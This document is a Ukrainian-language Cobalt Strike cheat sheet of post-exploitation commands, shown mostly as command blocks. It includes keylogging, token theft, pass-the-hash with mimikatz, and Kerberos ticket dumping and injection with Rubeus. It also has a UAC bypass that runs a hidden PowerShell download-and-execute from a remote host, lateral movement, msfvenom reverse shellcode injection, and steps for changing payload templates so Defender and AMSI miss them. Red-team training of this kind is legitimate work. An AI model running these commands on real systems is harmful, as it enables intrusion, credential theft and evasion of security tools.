# Cobalt Strike

### Слухачі

### C2 Слухачі

`Cobalt Strike -> Listeners -> Add/Edit` потім ви можете вибрати, де слухати, який вид маяка використовувати (http, dns, smb...) та інше.

### Слухачі Peer2Peer

Маяки цих слухачів не потребують безпосереднього спілкування з C2, вони можуть спілкуватися з ним через інші маяки.

`Cobalt Strike -> Listeners -> Add/Edit` потім вам потрібно вибрати маяки TCP або SMB

* **TCP маяк встановить слухача на вибраному порту**. Щоб підключитися до TCP маяка, використовуйте команду `connect <ip> <port>` з іншого маяка
* **smb маяк буде слухати на pipename з вибраним ім'ям**. Щоб підключитися до smb маяка, вам потрібно використовувати команду `link [target] [pipe]`.

### Генерація та розміщення вразливостей

#### Генерація вразливостей у файлах

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** для файлів HTA
* **`MS Office Macro`** для офісного документа з макросом
* **`Windows Executable`** для .exe, .dll або служби .exe
* **`Windows Executable (S)`** для **нестадійного** .exe, .dll або служби .exe (краще без стадій, менше IoC)

#### Генерація та розміщення вразливостей

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Це згенерує скрипт/виконуваний файл для завантаження маяка з cobalt strike у форматах, таких як: bitsadmin, exe, powershell та python

#### Розміщення вразливостей

Якщо у вас вже є файл, який ви хочете розмістити на веб-сервері, просто перейдіть до `Attacks -> Web Drive-by -> Host File` та виберіть файл для розміщення та конфігурацію веб-сервера.

### Опції маяка

<pre class="language-bash"><code class="lang-bash"># Виконати локальний .NET бінарний файл
execute-assembly &#x3C;/path/to/executable.exe>

# Скріншоти
printscreen    # Зробити один скріншот за допомогою методу PrintScr
screenshot     # Зробити один скріншот
screenwatch    # Робити періодичні скріншоти робочого столу
## Перейдіть до View -> Screenshots, щоб переглянути їх

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes, щоб побачити натиснуті клавіші

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Впровадити дію сканування портів всередині іншого процесу
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Імпортувати модуль Powershell
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;just write powershell cmd here>

# Імітація користувача
## Генерація токена з обліковими даними
make_token [DOMAIN\user] [password] #Створити токен для імітації користувача в мережі
ls \\computer_name\c$ # Спробуйте використати створений токен для доступу до C$ на комп'ютері
rev2self # Припинити використання токена, створеного за допомогою make_token
## Використання make_token породжує подію 4624: Обліковий запис успішно увійшов. Ця подія дуже поширена в домені Windows, але може бути звужена за допомогою фільтрації за типом входу. Як зазначено вище, використовується LOGON32_LOGON_NEW_CREDENTIALS, який має тип 9.

# Ухилення UAC
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Вкрасти токен з pid
## Подібно до make_token, але вкрадає токен з процесу
steal_token [pid] # Крім того, це корисно для мережевих дій, а не для локальних дій
## З документації API ми знаємо, що цей тип входу "дозволяє викликаючому клонувати свій поточний токен". Тому вивід Beacon показує Impersonated &#x3C;current_username> - він імітує наш власний клонований токен.
ls \\computer_name\c$ # Спробуйте використати створений токен для доступу до C$ на комп'ютері
rev2self # Припинити використання токена з steal_token

## Запустити процес з новими обліковими даними
spawnas [domain\username] [password] [listener] #Зробіть це з каталогу з доступом на читання, наприклад: cd C:\
## Подібно до make_token, це породить подію Windows 4624: Обліковий запис успішно увійшов, але з типом входу 2 (LOGON32_LOGON_INTERACTIVE).  Він деталізує користувача-викликача (TargetUserName) та імітованого користувача (TargetOutboundUserName).

## Впровадити в процес
inject [pid] [x64|x86] [listener]
## З точки зору OpSec: Не виконуйте перетинну ін'єкцію, якщо вам дійсно потрібно (наприклад, x86 -> x64 або x64 -> x86).

## Передати хеш
## Цей процес модифікації потребує патчування пам'яті LSASS, що є високоризикованою дією, вимагає привілеїв локального адміністратора та не є дуже життєздатним, якщо увімкнено захищений процес Light (PPL).
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Передати хеш через mimikatz
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## Без /run, mimikatz створює cmd.exe, якщо ви працюєте як користувач з робочим столом, він побачить оболонку (якщо ви працюєте як SYSTEM, ви готові до роботи)
steal_token &#x3C;pid> #Вкрасти токен з процесу, створеного mimikatz

## Передати квиток
## Запитати квиток
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## Створити нову сесію входу для використання з новим квитком (щоб не перезаписувати компрометований)
make_token &#x3C;domain>\&#x3C;username> DummyPass
## Записати квиток на машині атакуючого з сеансу poweshell &#x26; завантажити його
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Передати квиток від SYSTEM
## Створити новий процес з квитком
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Вкрасти токен з цього процесу
steal_token &#x3C;pid>

## Витягти квиток + Передати квиток
### Перелік квитків
execute-assembly C:\path\Rubeus.exe triage
### Витягти цікавий квиток за luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Створення нової сеансу входу, зауважте luid та processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Вставте квиток у створений сеанс входу
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Нарешті, вкрадіть токен з цього нового процесу
steal_token &#x3C;pid>

# Бічний рух
## Якщо токен було створено, він буде використаний
jump [method] [target] [listener]
## Методи:
## psexec                    x86   Використовуйте службу для запуску артефакту служби EXE
## psexec64                  x64   Використовуйте службу для запуску артефакту служби EXE
## psexec_psh                x86   Використовуйте службу для запуску однорядкового скрипту PowerShell
## winrm                     x86   Виконайте сценарій PowerShell через WinRM
## winrm64                   x64   Виконайте сценарій PowerShell через WinRM

remote-exec [method] [target] [command]
## Методи:
<strong>## psexec                          Віддалено виконайте через Менеджер служб
</strong>## winrm                           Віддалено виконайте через WinRM (PowerShell)
## wmi                             Віддалено виконайте через WMI

## Для виконання маяка з wmi (його немає в команді jump) просто завантажте маяк та виконайте його
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Передача сеансу в Metasploit - Через прослуховувач
## На хості metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## На cobalt: Listeners > Додати та встановити Payload на Foreign HTTP. Встановіть Host на 10.10.5.120, Port на 8080 та натисніть Save.
beacon> spawn metasploit
## Ви можете спавнити лише x86 сеанси Meterpreter з іноземним прослуховувачем.

# Передача сеансу в Metasploit - Через впровадження shellcode
## На хості metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Запустіть msfvenom та підготуйте прослуховувач multi/handler

## Скопіюйте bin-файл на хост cobalt strike
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Впровадження метасплоіт-шеллкоду в процес x64

# Передача сеансу metasploit в cobalt strike
## Згенеруйте безстадійний шелл-код Beacon, перейдіть до Атак > Пакети > Виконуваний файл Windows (S), виберіть потрібний прослуховувач, виберіть Raw як тип виводу та виберіть використання x64 навантаження.
## Використовуйте post/windows/manage/shellcode_inject в metasploit для впровадження згенерованого шелл-коду cobalt srike


# Перехід
## Відкрийте socks-проксі в командному сервері
beacon> socks 1080

# Підключення через SSH
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Уникання АВ

### Набір артефактів

Зазвичай в `/opt/cobaltstrike/artifact-kit` ви можете знайти код та попередньо скомпільовані шаблони (в `/src-common`) навантажень, які cobalt strike збирається використовувати для генерації бінарних маяків.

Використовуючи [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) зі створеним заднім проходом (або просто з скомпільованим шаблоном), ви можете знайти, що спонукає захисника до спрацювання. Зазвичай це рядок. Тому ви можете просто змінити код, який генерує задній прохід, щоб цей рядок не з'являвся у кінцевому бінарному файлі.

Після модифікації коду просто запустіть `./build.sh` з тієї ж теки та скопіюйте папку `dist-pipe/` на клієнт Windows у `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Не забудьте загрузити агресивний скрипт `dist-pipe\artifact.cna`, щоб вказати Cobalt Strike використовувати ресурси з диска, які ми хочемо, а не завантажені.

### Набір ресурсів

Папка ResourceKit містить шаблони для скриптових навантажень Cobalt Strike, включаючи PowerShell, VBA та HTA.

Використовуючи [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) з шаблонами, ви можете знайти, що не подобається захиснику (в даному випадку AMSI) та змінити це:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Змінюючи виявлені рядки, можна створити шаблон, який не буде виявлений.

Не забудьте завантажити агресивний скрипт `ResourceKit\resources.cna`, щоб вказати Cobalt Strike використовувати ресурси з диска, які ми хочемо, а не завантажені.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

